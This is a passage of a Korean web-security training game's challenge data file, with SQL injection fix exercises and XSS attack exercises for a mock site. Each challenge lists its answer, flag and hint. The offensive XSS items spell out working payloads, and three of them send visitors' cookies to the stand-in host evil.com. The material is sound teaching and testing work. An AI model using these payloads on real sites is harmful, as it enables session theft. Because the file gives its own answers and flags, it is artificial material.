    desc: `Hacking 트랙에서 본 것처럼, id를 숫자 컬럼으로 다루면서 값을 검증 없이 그대로 쿼리에 이어붙이면 따옴표 없이도 SQLi가 가능합니다(<code>1 OR 1=1</code> 등). 파라미터화 쿼리를 쓰는 것이 최선이지만, 값 자체를 진짜 정수로 강제 변환해서 검증하는 것도 추가 방어선이 됩니다.
<div class='code-snippet'>const id = req.query.id; <span style="color:#f87171;">// 문자열 그대로, 검증 없음</span><br>const query = \`SELECT * FROM products WHERE id=\${id}\`;</div>
👉 <code>req.query.id</code>를 10진 정수로 강제 변환하고, 숫자가 아니면 예외를 던지는 방어 코드를 작성하십시오. 정답 형식은 미리 알려드리지 않습니다.`,
    code: `const id = req.query.id;
const query = \`SELECT * FROM products WHERE id=\${id}\`; // 검증 없이 그대로 삽입
// [패치 필요: 정수로 강제 변환 + 검증]`,
    language: 'javascript',
    hint: "parseInt(값, 10) 으로 변환한 뒤, Number.isNaN() 으로 진짜 숫자가 맞는지 검증하고 아니면 예외를 던지세요."
  },
  {
    id: 'sq_s_m_4',
    title: '[패치] 프로덕션 환경에서 DB 에러 메시지 노출 차단',
    category: 'SQL Injection',
    role: 'Security',
    level: 'Medium',
    xp: 180,
    cwe: 'CWE-209',
    answer: "res.status(500).send('서버 오류가 발생했습니다.');",
    flag: 'FLAG{VERBOSE_ERROR_SUPPRESSED}',
    desc: `Hacking 트랙에서 본 에러 기반 SQL Injection은, 서버가 DB의 상세 에러 메시지(<code>err.message</code>)를 그대로 화면에 돌려주기 때문에 가능했습니다. 프로덕션 환경에서는 공격자에게 힌트를 주는 상세 에러 대신, 사용자에게는 일반적인 오류 메시지만 보여주고 상세 내용은 서버 로그에만 남겨야 합니다.
<div class='code-snippet'>try {<br>&nbsp;&nbsp;const row = await db.query(query);<br>} catch (err) {<br>&nbsp;&nbsp;res.send(<span style="color:#f87171;">err.message</span>); // DB 에러를 그대로 노출<br>}</div>
👉 catch 블록에서, 에러 상세 내용을 화면에 노출하지 않고 <code>500</code> 상태 코드와 함께 일반적인 오류 메시지만 응답하는 코드를 작성하십시오. 정답 형식은 미리 알려드리지 않습니다.`,
    code: `try {
  const row = await db.query(query);
} catch (err) {
  res.send(err.message); // 취약: DB 에러 메시지를 그대로 노출
  // [패치 필요: 일반적인 오류 메시지로 교체 + 500 상태 코드]
}`,
    language: 'javascript',
    hint: "res.status(500).send('일반적인 메시지') 형태로, err.message 대신 사용자에게 안전한 문구만 응답하세요."
  },
  {
    id: 'sq_s_h_1',
    title: '[패치] ORM(Sequelize) 파라미터 바인딩 적용',
    category: 'SQL Injection',
    role: 'Security',
    level: 'Hard',
    xp: 240,
    cwe: 'CWE-89',
    answer: "User.findAll({ where: { username: input } });",
    flag: 'FLAG{ORM_SAFE_QUERY_BUILDER_APPLIED}',
    desc: `ORM을 쓰더라도 <code>sequelize.query()</code>로 원시(raw) SQL 문자열을 직접 조립하면 SQLi에 그대로 노출됩니다. 대신 ORM이 제공하는 쿼리 빌더(where 옵션)를 사용하면 내부적으로 파라미터 바인딩이 적용됩니다.
<br><br>👉 raw query 대신 쿼리 빌더를 사용하는 코드를 직접 작성하십시오. 정답 형식은 미리 알려드리지 않습니다. 위 설명과 힌트를 참고해 구성해 보세요.`,
    code: `// 취약한 코드: raw 쿼리 문자열 직접 조립
const users = await sequelize.query(
  \`SELECT * FROM users WHERE username = '\${input}'\`
);

// [패치 필요: Sequelize 쿼리 빌더(where 옵션) 사용]`,
    language: 'javascript',
    hint: "raw query 대신 모델의 findAll({ where: {...} }) 쿼리 빌더를 사용하세요."
  },
  {
    id: 'sq_s_h_2',
    title: '[패치] 최소 권한 원칙으로 DROP 공격 최후 방어',
    category: 'SQL Injection',
    role: 'Security',
    level: 'Hard',
    xp: 250,
    cwe: 'CWE-269',
    answer: "REVOKE DROP ON app_db.* FROM 'app_user'@'localhost';",
    flag: 'FLAG{LEAST_PRIVILEGE_DROP_REVOKED}',
    desc: `Hacking 트랙에서 봤던 Stacked Query DROP TABLE 공격은, 파라미터화 쿼리를 완벽히 적용해도 만약 다른 경로로 SQLi가 새로 발견된다면 여전히 테이블 전체를 날려버릴 수 있습니다. 최소 권한 원칙(Principle of Least Privilege)에 따르면, 애플리케이션이 실제로 필요로 하지 않는 권한(DROP, ALTER 등)은 DB 계정에서 아예 회수해두는 것이 마지막 방어선이 됩니다.
<div class='code-snippet'>-- 애플리케이션 전용 DB 계정: app_user@localhost, 대상 DB: app_db<br>-- 이 계정은 SELECT/INSERT/UPDATE/DELETE만 필요하고, 테이블을 지울 일은 없음</div>
👉 <code>app_db</code> 데이터베이스에서 <code>app_user@localhost</code> 계정의 DROP 권한을 회수하는 SQL 문을 작성하십시오. 정답 형식은 미리 알려드리지 않습니다. 위 설명과 힌트를 참고해 구성해 보세요.`,
    code: `-- 현재 app_user는 필요 이상으로 DROP 권한까지 갖고 있음
-- GRANT ALL PRIVILEGES ON app_db.* TO 'app_user'@'localhost';

-- [패치 필요: DROP 권한만 회수]`,
    language: 'sql',
    hint: "REVOKE [권한] ON [DB].* FROM '[계정]'@'[호스트]'; 형식입니다. DROP 권한만 콕 집어 회수하세요."
  },
  {
    id: 'sq_s_h_3',
    title: '[고급 패치] WAF 우회에 뚫리지 않는 근본적 방어 — 파라미터화',
    category: 'SQL Injection',
    role: 'Security',
    level: 'Hard',
    xp: 245,
    cwe: 'CWE-89',
    answer: "db.query('SELECT * FROM users WHERE id = ? AND pw = ?', [username, password]);",
    flag: 'FLAG{WAF_BYPASS_ROOT_CAUSE_FIXED}',
    desc: `Hacking 트랙에서 본 것처럼, 정규식으로 <code>OR</code>/<code>AND</code> 앞뒤 공백만 탐지하는 WAF는 <code>/**/</code> 같은 주석 치환으로 손쉽게 우회당합니다. WAF는 알려진 패턴만 막는 "임시 방어선"일 뿐, 근본적인 해결책이 아닙니다. 진짜 해결책은 애초에 사용자 입력이 SQL 문법의 일부로 해석될 수 없도록 파라미터화 쿼리를 쓰는 것입니다.
<div class='code-snippet'>function isBlocked(input) {<br>&nbsp;&nbsp;return /\\s(OR|AND)\\s/i.test(input); // /**/ 로 공백을 대체하면 이 정규식을 그대로 통과함<br>}<br>const query = \`SELECT * FROM users WHERE id='<span style="color:#f87171;">\${username}</span>' AND pw='\${password}'\`;</div>
👉 정규식 기반 WAF 필터링에 의존하지 말고, 문자열 결합 자체를 없애는 파라미터화 쿼리 코드를 작성하십시오. 정답 형식은 미리 알려드리지 않습니다.`,
    code: `function isBlocked(input) {
  return /\\s(OR|AND)\\s/i.test(input); // WAF: 공백으로 둘러싸인 OR/AND만 탐지 (우회당함)
}
if (isBlocked(username)) return res.status(403).send('차단되었습니다');
const query = \`SELECT * FROM users WHERE id='\${username}' AND pw='\${password}'\`;
// [패치 필요: WAF 필터링을 걷어내고 파라미터화 쿼리로 근본 해결]`,
    language: 'javascript',
    hint: "db.query('...WHERE id = ? AND pw = ?', [username, password]) 형태로, 문자열 결합과 WAF 정규식 필터링을 모두 걷어내고 물음표 플레이스홀더로 교체하세요."
  },
  {
    id: 'sq_s_h_4',
    title: '[고급 패치] 반복 요청 속도 제한으로 블라인드 SQLi 자동화 방어',
    category: 'SQL Injection',
    role: 'Security',
    level: 'Hard',
    xp: 250,
    cwe: 'CWE-799',
    answer: "app.use('/account/status', rateLimit({ windowMs: 60000, max: 20 }));",
    flag: 'FLAG{BLIND_SQLI_RATE_LIMITED}',
    desc: `블라인드 SQL Injection은 참/거짓 응답을 수백~수천 번 반복 요청하며 한 글자씩 알아내는 방식입니다. 근본적으로는 파라미터화 쿼리로 SQLi 자체를 막아야 하지만, 이런 자동화 스크립트는 짧은 시간에 매우 많은 요청을 보낸다는 특징이 있어, 요청 속도를 제한하는 것도 공격을 크게 늦추는 유효한 추가 방어선이 됩니다.
<div class='code-snippet'>app.get('/account/status', async (req, res) =&gt; {<br>&nbsp;&nbsp;const row = await db.query(query); <span style="color:#f87171;">// 요청 횟수 제한이 전혀 없음</span><br>});</div>
👉 <code>express-rate-limit</code> 미들웨어를 사용해, <code>/account/status</code> 엔드포인트에 1분(60000ms)에 최대 20회로 요청을 제한하는 코드를 작성하십시오. 정답 형식은 미리 알려드리지 않습니다.`,
    code: `const express = require('express');
const app = express();
// [패치 필요: /account/status 엔드포인트에 요청 속도 제한 추가]
app.get('/account/status', async (req, res) => {
  const row = await db.query(query);
  res.send(row ? '활성 계정입니다' : '존재하지 않는 계정입니다');
});`,
    language: 'javascript',
    hint: "app.use('/경로', rateLimit({ windowMs: 시간(ms), max: 최대횟수 })) 형태입니다. 60000ms(1분)에 20회로 제한해 보세요."
  },

  // --- XSS / Hacking ---
  {
    id: 'xs_h_t_1',
    title: '[튜토리얼 1단계] 게시판에 실행 코드 심기 (XSS 기초)',
    category: 'XSS 스크립트',
    role: 'Hacking',
    level: 'Tutorial',
    xp: 50,
    cwe: 'CWE-79',
    answer: "<script>alert(document.cookie)</script>",
    flag: 'FLAG{XSS_COOKIE_STEAL_BASIC}',
    mockUi: {
      urlBar: 'target.local/board/write',
      siteLabel: '📝 자유게시판 글쓰기 (XSS 입문 실습)',
      fieldLabel: '게시글 내용',
      fieldPlaceholder: '<script>alert(document.cookie)</script> 입력하기',
      buttonLabel: '등록',
    },
    desc: `🌟 <b>어떤 상황인가요? (마법 쪽지 비유)</b><br>
게시판에 글을 쓰면 그 내용이 다른 사람 화면에도 그대로 보이죠? 그런데 웹사이트가 글자 속에 숨겨진 코드를 검사하지 않으면 엄청난 일이 벌어집니다.<br>
글 내용에 <code>&lt;script&gt;</code> 태그를 적으면, 브라우저는 그걸 단순한 글자가 아니라 <b>"지금 당장 실행해야 하는 프로그램 명령어"</b>로 오해해요!

🔍 <b>취약점의 비밀: alert(document.cookie)</b><br>
<code>document.cookie</code>는 현재 브라우저에 저장된 로그인 열쇠(세션 쿠키)예요. <code>alert(...)</code>는 이 값을 화면 경고창에 띄우는 코드입니다.<br>
이 글을 읽는 모든 사람의 로그인 쿠키가 화면에 노출되며, 실전 해킹에서는 이 쿠키를 해커의 서버로 전송해 계정을 탈취합니다.

<br>🎯 <b>미션 클리어 방법</b><br>
아래 게시판 글쓰기 입력창(또는 터미널 창)에 스크립트 태그를 그대로 입력하고 [등록] 버튼을 누르세요.
<br>👉 입력할 정답: <code class="pt-answer">&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code>`,
    code: `<div class="board-content">
  <!-- 사용자 입력값이 검증 없이 HTML 코드로 출력됨 -->
  \${userContent}
</div>`,
    language: 'html',
    hint: "정답은 [<script>alert(document.cookie)</script>] 입니다. 꺽쇠 괄호와 소괄호를 빠뜨리지 않고 그대로 입력해 보세요!"
  },
  {
    id: 'xs_h_t_2',
    title: '[튜토리얼 2단계] 검색창 감옥에서 탈출하기 (HTML 속성 탈출)',
    category: 'XSS 스크립트',
    role: 'Hacking',
    level: 'Tutorial',
    xp: 60,
    cwe: 'CWE-79',
    answer: '"><script>alert(1)</script>',
    flag: 'FLAG{XSS_ATTR_ESCAPE_SUCCESS}',
    mockUi: {
      urlBar: 'target.local/search',
      siteLabel: '🔍 상품 검색 (속성 탈출 실습)',
      fieldLabel: '검색어',
      fieldPlaceholder: '"><script>alert(1)</script> 입력하기',
      buttonLabel: '검색',
    },
    desc: `🌟 <b>어떤 상황인가요? (감옥 탈출 비유)</b><br>
이번엔 검색창에 입력한 값이 <code>&lt;input value="<span style="color:#f87171;">검색어</span>"&gt;</code> 처럼 큰따옴표 감옥 안에 갇혀 있어요!<br>
이 상태에서는 그냥 <code>&lt;script&gt;</code>를 넣어도 검색어 글자로만 취급되어 실행되지 않습니다.

🔍 <b>취약점의 비밀: 따옴표(")와 닫는 괄호(>)로 탈출하기</b><br>
1. 맨 앞에 큰따옴표(<code>"</code>)를 쓰면 <code>value="..."</code> 속성이 먼저 닫힙니다.<br>
2. 뒤이어 닫는 꺽쇠(<code>&gt;</code>)를 쓰면 <code>&lt;input&gt;</code> 태그 자체가 완전히 닫혀 밖으로 탈출합니다.<br>
3. 이제 자유의 몸이 되었으니 곧바로 <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> 를 실행시킬 수 있습니다!

<br>🎯 <b>미션 클리어 방법</b><br>
큰따옴표와 꺽쇠로 탈출하는 정답 문자열을 검색창에 그대로 입력하고 [검색]을 누르세요.
<br>👉 입력할 정답: <code class="pt-answer">"&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code>`,
    code: `<input type="text" name="search" value="\${userInput}">`,
    language: 'html',
    hint: '정답은 ["><script>alert(1)</script>] 입니다. 큰따옴표(")와 닫는 괄호(>)로 시작해 스크립트 태그를 덧붙이세요!'
  },

  // --- XSS / Security (Defensive) ---
  {
    id: 'xs_s_t_1',
    title: '[튜토리얼 1단계] 특수문자 무력화하기 (htmlspecialchars 방어)',
    category: 'XSS 스크립트',
    role: 'Security',
    level: 'Tutorial',
    xp: 50,
    cwe: 'CWE-79',
    answer: "echo htmlspecialchars($_POST['msg']);",
    flag: 'FLAG{HTML_SPECIALCHARS_SECURED}',
    desc: `🌟 <b>어떤 상황인가요? (가위손 장갑 비유)</b><br>
공격자가 <code>&lt;script&gt;</code> 같은 위험한 코드를 심으려면 꺽쇠 괄호(<code>&lt;</code>, <code>&gt;</code>)가 필수적이에요.<br>
이 꺽쇠들을 안전한 글자 형태(<code>&amp;lt;</code>, <code>&amp;gt;</code>)로 바꿔버리면(이스케이프 처리), 브라우저는 절대 코드로 실행하지 않고 순수한 텍스트로만 안전하게 화면에 보여줍니다.

🔍 <b>보안 패치의 핵심</b><br>
PHP에서는 <code>htmlspecialchars(...)</code> 함수가 이 위험한 특수문자들을 전부 무해한 글자로 안전하게 변환해 줍니다.

<br>🎯 <b>미션 클리어 방법</b><br>
아래 터미널 입력창에 안전한 htmlspecialchars 변환 출력 코드를 입력하고 [RUN]을 누르세요.
<br>👉 입력할 정답: <code class="pt-answer">echo htmlspecialchars($_POST['msg']);</code>`,
    code: `// 취약한 코드: 사용자 입력을 검증 없이 그대로 출력
// echo $_POST['msg'];

// [보안 패치: htmlspecialchars로 특수문자 치환]`,
    language: 'php',
    hint: "정답은 [echo htmlspecialchars($_POST['msg']);] 입니다. 복사해서 터미널 창에 붙여넣어 보세요!"
  },
  {
    id: 'xs_s_t_2',
    title: '[튜토리얼 2단계] 자바스크립트의 쿠키 접근 차단 (HttpOnly 방어)',
    category: 'XSS 스크립트',
    role: 'Security',
    level: 'Tutorial',
    xp: 60,
    cwe: 'CWE-79',
    answer: "Set-Cookie: session_id=123; HttpOnly",
    flag: 'FLAG{HTTPONLY_COOKIE_ARMORED}',
    desc: `🌟 <b>어떤 상황인가요? (이중 철문 금고 비유)</b><br>
만약 개발자의 실수로 사이트 어딘가에 XSS 취약점이 뚫려 해커의 악성 스크립트가 실행되더라도, <b>가장 중요한 로그인 쿠키만큼은 절대 훔쳐가지 못하게</b> 막는 이중 잠금장치가 있습니다.

🔍 <b>보안 패치의 핵심: HttpOnly 속성</b><br>
쿠키를 발급할 때 뒤에 <code>HttpOnly</code> 옵션을 붙여주면, 브라우저가 자바스크립트(<code>document.cookie</code>)의 접근을 물리적으로 원천 차단합니다!

<br>🎯 <b>미션 클리어 방법</b><br>
아래 터미널 입력창에 HttpOnly 플래그가 추가된 쿠키 헤더를 그대로 입력하고 [RUN]을 누르세요.
<br>👉 입력할 정답: <code class="pt-answer">Set-Cookie: session_id=123; HttpOnly</code>`,
    code: `// 기존 취약한 헤더 (자바스크립트가 읽을 수 있음)
Set-Cookie: session_id=123;

// [보안 패치: HttpOnly 보호 속성 추가]`,
    language: 'http',
    hint: "정답은 [Set-Cookie: session_id=123; HttpOnly] 입니다. 세미콜론(;) 뒤에 한 칸 띄우고 HttpOnly를 덧붙이세요."
  },
  {
    id: 'xs_h_e_1',
    title: '[실전 Level 1] script가 막혔을 때 이미지 태그(img onerror)로 우회',
    category: 'XSS 스크립트',
    role: 'Hacking',
    level: 'Easy',
    xp: 110,
    cwe: 'CWE-79',
    answer: '<img src=x onerror=alert(document.cookie)>',
    flag: 'FLAG{IMG_ONERROR_HANDLER_TRIGGERED}',
    mockUi: {
      urlBar: 'target.local/board/write',
      siteLabel: '📝 자유게시판 글쓰기 (필터 우회)',
      fieldLabel: '게시글 내용',
      fieldPlaceholder: '<img src=x onerror=alert(document.cookie)> 입력',
      buttonLabel: '등록',
    },
    desc: `🌟 <b>어떤 상황인가요? (우회 침투 비유)</b><br>
웹사이트 개발자가 단순하게 <code>&lt;script&gt;</code> 단어만 금지어로 막아두었어요. 하지만 자바스크립트를 실행할 수 있는 HTML 태그는 수십 가지나 됩니다!

🔍 <b>취약점의 비밀: 깨진 이미지의 onerror 이벤트</b><br>
<code>&lt;img src=x onerror=...&gt;</code> 태그를 쓰면:<br>
1. <code>src=x</code> 라는 존재하지 않는 엉터리 이미지 주소를 요청합니다.<br>
2. 이미지를 불러오지 못해 <b>에러(onerror)</b>가 발생합니다.<br>
3. 에러가 나는 그 즉시 뒤에 적어둔 악성 자바스크립트 코드가 자동 실행됩니다!

<br>🎯 <b>미션 클리어 방법</b><br>
아래 게시글 내용 칸에 img onerror 페이로드를 그대로 입력하고 [등록]을 누르세요.
<br>👉 입력할 정답: <code class="pt-answer">&lt;img src=x onerror=alert(document.cookie)&gt;</code>`,
    code: `function sanitize(input) {
  if (input.includes('<script>')) throw new Error('blocked');
  return input; // script 태그만 막고 img 태그는 허용하는 허점!
}
board.innerHTML = sanitize(userContent);`,
    language: 'javascript',
    hint: '정답은 [<img src=x onerror=alert(document.cookie)>] 입니다. script 대신 img 태그의 onerror 이벤트를 사용하세요.'
  },
  {
    id: 'xs_h_e_2',
    title: '[실전 Level 1] 모든 방문자에게 영구 감염되는 저장형(Stored) XSS',
    category: 'XSS 스크립트',
    role: 'Hacking',
    level: 'Easy',
    xp: 120,
    cwe: 'CWE-79',
    answer: "<script>fetch('https://evil.com/steal?c='+document.cookie)</script>",
    flag: 'FLAG{STORED_XSS_PROFILE_BIO_PWNED}',
    mockUi: {
      urlBar: 'target.local/profile/edit',
      siteLabel: '👤 프로필 편집 (저장형 XSS 실습)',
      fieldLabel: '자기소개 (Bio)',
      fieldPlaceholder: "<script>fetch('https://evil.com/steal?c='+document.cookie)</script> 입력",
      buttonLabel: '저장',
    },
    desc: `🌟 <b>어떤 상황인가요? (시한폭탄 비유)</b><br>
프로필 자기소개(Bio)는 데이터베이스(DB)에 <b>영구히 저장</b>됩니다.<br>
여기에 악성 스크립트를 심어두면, 앞으로 이 프로필을 구경하러 오는 일반 사용자뿐만 아니라 최고 관리자까지 방문하는 순간마다 코드가 실행되어 정보가 털립니다!

🔍 <b>취약점의 비밀: 외부 서버로 몰래 전송(fetch)</b><br>
<code>fetch('https://evil.com/steal?c=' + document.cookie)</code> 는 방문자의 화면 뒤에서 조용히 쿠키 값을 훔쳐 공격자 서버(evil.com)로 빼돌리는 실전 공격 코드입니다.

<br>🎯 <b>미션 클리어 방법</b><br>
아래 자기소개 칸에 악성 전송 스크립트를 입력하고 [저장]을 누르세요.
<br>👉 입력할 정답: <code class="pt-answer">&lt;script&gt;fetch('https://evil.com/steal?c='+document.cookie)&lt;/script&gt;</code>`,
    code: `// 프로필 수정 API - 검증 없이 DB에 영구 저장
await db.query('UPDATE users SET bio=? WHERE id=?', [req.body.bio, userId]);

// 프로필 조회 페이지 - 저장된 악성 코드를 방문자에게 그대로 뿌려줌
res.send(\`<div class="bio">\${user.bio}</div>\`);`,
    language: 'javascript',
    hint: "정답은 [<script>fetch('https://evil.com/steal?c='+document.cookie)</script>] 입니다. 복사해서 자기소개 칸에 붙여넣어 보세요!"
  },
  {
    id: 'xs_h_e_3',
    title: '[실전 Level 1] 클릭 없이 페이지 열리자마자 실행되는 자동 실행 XSS',
    category: 'XSS 스크립트',
    role: 'Hacking',
    level: 'Easy',
    xp: 115,
    cwe: 'CWE-79',
    answer: "<input onfocus=alert(document.cookie) autofocus>",
    flag: 'FLAG{AUTOFOCUS_ONFOCUS_XSS_TRIGGERED}',
    mockUi: {
      urlBar: 'target.local/board/write',
      siteLabel: '📝 자유게시판 글쓰기 (자동 실행 실습)',
      fieldLabel: '게시글 내용',
      fieldPlaceholder: '<input onfocus=alert(document.cookie) autofocus> 입력',
      buttonLabel: '등록',
    },
    desc: `🌟 <b>어떤 상황인가요? (자동 발판 비유)</b><br>
보통 이벤트 핸들러(onclick 등)는 사용자가 마우스로 클릭해야 실행됩니다. 하지만 사용자가 아무것도 누르지 않아도 페이지가 열리자마자 바로 터지는 기법이 있습니다!

🔍 <b>취약점의 비밀: autofocus 와 onfocus 의 결합</b><br>
1. <code>&lt;input autofocus&gt;</code> 는 페이지가 열리자마자 브라우저가 자동으로 그 입력창을 선택(포커스)하게 만듭니다.<br>
2. 포커스가 되는 그 0.001초 만에 <code>onfocus=...</code> 핸들러가 발동하여 코드가 자동으로 실행됩니다!

<br>🎯 <b>미션 클리어 방법</b><br>
아래 게시글 내용 칸에 자동 포커스 페이로드를 입력하고 [등록]을 누르세요.
<br>👉 입력할 정답: <code class="pt-answer">&lt;input onfocus=alert(document.cookie) autofocus&gt;</code>`,
    code: `function sanitize(input) {
  if (input.includes('<script>')) throw new Error('blocked');
  return input; // input 태그와 autofocus/onfocus 속성은 통과
}
board.innerHTML = sanitize(userContent);`,
    language: 'javascript',
    hint: "정답은 [<input onfocus=alert(document.cookie) autofocus>] 입니다. autofocus 속성이 로드 즉시 onfocus를 격발시킵니다."
  },
  {
    id: 'xs_h_e_4',
    title: '[실전 Level 1] 검색창에서 그대로 튕겨 나오는 반사형(Reflected) XSS',
    category: 'XSS 스크립트',
    role: 'Hacking',
    level: 'Easy',
    xp: 110,
    cwe: 'CWE-79',
    answer: "<script>alert(document.domain)</script>",
    flag: 'FLAG{REFLECTED_XSS_NO_RESULTS_MSG}',
    mockUi: {
      urlBar: 'target.local/search',
      siteLabel: '🔍 상품 검색 (반사형 실습)',
      fieldLabel: '검색어',
      fieldPlaceholder: '<script>alert(document.domain)</script> 입력',
      buttonLabel: '검색',
    },
    desc: `🌟 <b>어떤 상황인가요? (메아리 비유)</b><br>
저장형 XSS가 DB에 저장되어 터지는 것이라면, 반사형 XSS는 산에서 "야호" 하고 외치면 메아리가 그대로 되돌아오듯, 내가 보낸 악성 코드가 서버에 저장되지 않고 <b>응답 화면으로 곧바로 튕겨 나오는(반사되는)</b> 취약점이에요!

🔍 <b>취약점의 비밀</b><br>
검색 결과가 없을 때 서버가 <code>"[검색어]에 대한 결과가 없습니다"</code> 라며 입력값을 그대로 화면에 출력합니다. 이때 스크립트를 전달하면 즉시 브라우저에서 실행됩니다.

<br>🎯 <b>미션 클리어 방법</b><br>
아래 검색창에 현재 사이트 도메인을 확인하는 스크립트를 입력하고 [검색]을 누르세요.
<br>👉 입력할 정답: <code class="pt-answer">&lt;script&gt;alert(document.domain)&lt;/script&gt;</code>`,
    code: `app.get('/search', (req, res) => {
  const results = search(req.query.q);
  if (results.length === 0) {
    res.send(\`<p>\${req.query.q}에 대한 검색 결과가 없습니다.</p>\`); // 검증 없이 그대로 렌더링
  }
});`,
    language: 'javascript',
    hint: "검색창에 <script>alert(document.domain)</script> 를 그대로 입력해 보세요. 검색 결과가 없으면 이 값이 그대로 화면에 반사됩니다."
  },
  {
    id: 'xs_h_m_1',
    title: '[실전] DOM 기반 XSS (location.hash → innerHTML)',
    category: 'XSS 스크립트',
    role: 'Hacking',
    level: 'Medium',
    xp: 170,
    cwe: 'CWE-79',
    answer: "#<img src=x onerror=alert(1)>",
    flag: 'FLAG{DOM_BASED_HASH_INNERHTML_XSS}',
    mockUi: {
      urlBar: 'target.local/welcome',
      siteLabel: '🌐 환영 페이지 (주소창 끝에 이어붙이기)',
      fieldLabel: '주소창 끝에 추가할 값 (# 포함)',
      fieldPlaceholder: '#으로 시작하는 값을 입력하세요',
      buttonLabel: '이동',
    },
    desc: `서버를 거치지 않고 브라우저 자바스크립트가 <code>location.hash</code>(주소창의 # 뒷부분)를 읽어 그대로 <code>innerHTML</code>에 꽂아넣고 있습니다. 이런 취약점은 서버 로그에도 남지 않아 탐지가 까다로운 DOM 기반 XSS입니다.
<div class='code-snippet'>document.getElementById('welcome').innerHTML = decodeURIComponent(<span style="color:#f87171;">location.hash</span>.substring(1));</div>
👉 URL의 해시(#) 뒷부분에 들어갈 페이로드를 직접 구성해서 작성하십시오 (# 포함해서 제출). 정답 형식은 미리 알려드리지 않으니, Easy에서 배운 필터 우회 기법을 응용해 보세요.`,
    code: `// script.js
window.addEventListener('hashchange', () => {
  const msg = decodeURIComponent(location.hash.substring(1));
  document.getElementById('welcome').innerHTML = msg; // 검증 없이 DOM에 삽입
});`,
    language: 'javascript',
    hint: "이미지 태그의 onerror 이벤트로 존재하지 않는 이미지를 강제로 실패시켜 스크립트를 실행시켜 보세요. 맨 앞에 # 을 붙이는 것도 잊지 마세요."
  },
  {
    id: 'xs_h_m_2',
    title: '[실전] 블랙리스트 필터 우회 (대소문자 혼용)',
    category: 'XSS 스크립트',
    role: 'Hacking',
    level: 'Medium',
    xp: 180,
    cwe: 'CWE-79',
    answer: '<ScRiPt>alert(1)</sCrIpT>',
    flag: 'FLAG{CASE_MIXED_BLACKLIST_BYPASSED}',
    mockUi: {
      urlBar: 'target.local/board/write',
      siteLabel: '📝 자유게시판 글쓰기',
      fieldLabel: '게시글 내용',
      fieldPlaceholder: '내용을 입력하세요...',
      buttonLabel: '등록',
    },
    desc: `필터가 소문자 <code>&lt;script&gt;</code>만 정확히 찾아 제거하고 있습니다. 대소문자를 구분하지 않고 태그를 해석하는 HTML 파서의 특성을 이용해 필터를 우회할 수 있습니다.
<div class='code-snippet'>input.replace('&lt;script&gt;', '').replace('&lt;/script&gt;', '')</div>
👉 대소문자를 섞어서 블랙리스트 필터를 우회하는 스크립트 태그를 직접 작성하십시오. 정답 형식은 미리 알려드리지 않습니다.`,
    code: `function sanitize(input) {
  return input.replace('<script>', '').replace('</script>', '');
}
board.innerHTML = sanitize(userContent);`,
    language: 'javascript',
    hint: "script 태그의 알파벳 대소문자를 무작위로 섞어서 작성해 보세요. HTML 파서는 대소문자를 구분하지 않지만, 문자열 replace()는 완전히 일치해야만 지워낼 수 있습니다."
  },
  {
    id: 'xs_h_m_3',
    title: '[실전] Tutorial 페이로드를 이미지 비콘으로 확장',
    category: 'XSS 스크립트',
    role: 'Hacking',
    level: 'Medium',
    xp: 185,
    cwe: 'CWE-79',
    answer: "<script>new Image().src='https://evil.com/steal?c='+document.cookie</script>",
    flag: 'FLAG{IMAGE_BEACON_COOKIE_EXFIL}',
    mockUi: {
      urlBar: 'target.local/search',
      siteLabel: '🔍 검색 결과 페이지',
      fieldLabel: '검색어',
      fieldPlaceholder: '검색어를 입력하세요',
      buttonLabel: '검색',
    },
    desc: `이 검색 결과 페이지는 검색어를 필터 없이 그대로 렌더링합니다. Tutorial에서는 <code>alert(document.cookie)</code>로 쿠키 값을 화면에 띄워서 "취약하다"는 것만 증명했습니다. 실전에서는 그 쿠키를 alert 대신 공격자 서버로 몰래 전송해야 합니다 — 이때 자주 쓰이는 방법이 눈에 보이지 않는 이미지 요청(beacon)을 이용하는 것입니다. <code>new Image().src</code>에 URL을 대입하면, 브라우저가 그 주소로 이미지를 요청하면서 URL에 실은 데이터가 함께 전송됩니다.
<div class='code-snippet'>&lt;div class="results"&gt;<span style="color:#f87171;">[여러분이 입력한 검색어가 여기 그대로 삽입됨]</span>&lt;/div&gt;</div>
👉 Tutorial의 <code>&lt;script&gt;...document.cookie...&lt;/script&gt;</code> 구조는 그대로 두고, 내부 코드만 alert 대신 이미지 비콘으로 <code>https://evil.com/steal</code> 에 쿠키를 전송하도록 확장해서 검색창에 입력하십시오. 정답 형식은 미리 알려드리지 않습니다.`,
    code: `<div class="results">
  <!-- 검색어가 검증 없이 그대로 출력됨 -->
  \${searchQuery}
</div>`,
    language: 'html',
    hint: "<script> 태그 안에서 new Image().src = '주소' + document.cookie 형태로 작성하면, 브라우저가 그 주소로 이미지를 요청하는 척하면서 쿠키 값을 함께 전송합니다."
  },
  {
    id: 'xs_h_m_4',
    title: '[실전] postMessage 기반 DOM XSS',
    category: 'XSS 스크립트',
    role: 'Hacking',
    level: 'Medium',
    xp: 185,
    cwe: 'CWE-79',
    answer: "<script>document.location='https://evil.com/steal?c='+document.cookie</script>",
    flag: 'FLAG{POSTMESSAGE_DOM_XSS_COOKIE_STOLEN}',
    desc: `이번엔 <code>location.hash</code>가 아니라 다른 창에서 보낸 <code>postMessage</code> 메시지를 그대로 innerHTML에 꽂아넣는 코드입니다. <code>postMessage</code>는 서로 다른 출처(origin)의 창끼리 메시지를 주고받을 수 있게 해주는 기능인데, 이 코드는 메시지를 보낸 출처가 어디인지 전혀 검증하지 않습니다 — 즉 공격자가 만든 페이지에서 iframe이나 팝업으로 이 페이지를 열고 임의의 메시지를 보내면 그대로 실행됩니다.
<div class='code-snippet'>window.addEventListener('message', (e) =&gt; {<br>&nbsp;&nbsp;document.getElementById('content').innerHTML = <span style="color:#f87171;">e.data</span>; // e.origin 검증 없음<br>});</div>
👉 공격자 페이지가 <code>postMessage</code>로 보낼 데이터로, 방문자의 쿠키를 <code>https://evil.com/steal</code> 로 전송하는 XSS 페이로드를 직접 작성하십시오. 정답 형식은 미리 알려드리지 않습니다.`,
    code: `window.addEventListener('message', (e) => {
  document.getElementById('content').innerHTML = e.data; // e.origin(보낸 곳) 검증이 전혀 없음
});`,
    language: 'javascript',
    hint: "Easy에서 배운 것처럼 <script> 태그 안에 document.location = '주소' + document.cookie 형태로 쿠키를 전송하는 코드를 작성하면 됩니다."
  },
  {
    id: 'xs_h_m_5',
    title: '[실전] 중첩 태그로 단일 치환 필터 우회',
